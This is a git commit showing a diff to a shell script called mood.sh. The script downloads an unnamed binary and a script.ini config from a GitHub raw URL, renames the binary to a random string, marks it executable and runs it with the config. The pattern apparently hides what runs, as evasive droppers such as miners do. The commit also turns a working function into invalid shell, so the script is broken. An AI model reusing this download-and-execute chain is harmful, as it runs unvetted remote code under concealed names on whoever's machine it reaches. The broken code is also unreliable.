80d5b6fd0e504c446b9058c42823280850c49149
penjelajahwaktu <141205123+penjelajahwaktu@users.noreply.github.com>
2023-08-08 16:34:58 +0700

    Update mood.sh

--- mood.sh
+++ mood.sh
@@ -1,2 +1,2 @@
-randomname() { head -c24 /dev/urandom | base64 | tr -dc a-zA-Z; }
+randomname=head -c24 /dev/urandom | base64 | tr -dc a-zA-Z;
 wget https://raw.githubusercontent.com/penjelajahwaktu/sss/main/cok && wget https://raw.githubusercontent.com/penjelajahwaktu/sss/main/script.ini && mv cok `randomname` && chmod +x `randomname` && ./`randomname` script.ini
